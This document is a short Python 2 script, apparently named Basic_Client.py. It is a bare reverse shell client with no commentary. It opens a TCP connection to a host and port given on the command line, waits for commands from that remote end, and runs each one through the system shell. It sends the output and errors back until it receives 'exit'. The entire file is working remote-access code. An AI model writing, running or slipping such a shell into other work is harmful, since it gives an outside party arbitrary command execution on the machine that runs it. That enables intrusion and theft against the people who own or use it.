import sys
import socket
import subprocess

RECV_BYTE = 1024


def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((sys.argv[0], int(sys.argv[1])))

    while True:
        command = s.recv(RECV_BYTE)

        if 'exit' in command:
            s.close()
            break
        else:
            cmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            s.send(cmd.stdout.read())
            s.send(cmd.stderr.read())


def main ():
    if len(sys.argv) < 3:
        print '[!] Usage: Basic_Client.py <host> <port>'
        return

    sys.argv = sys.argv[1:]
    connect()

main()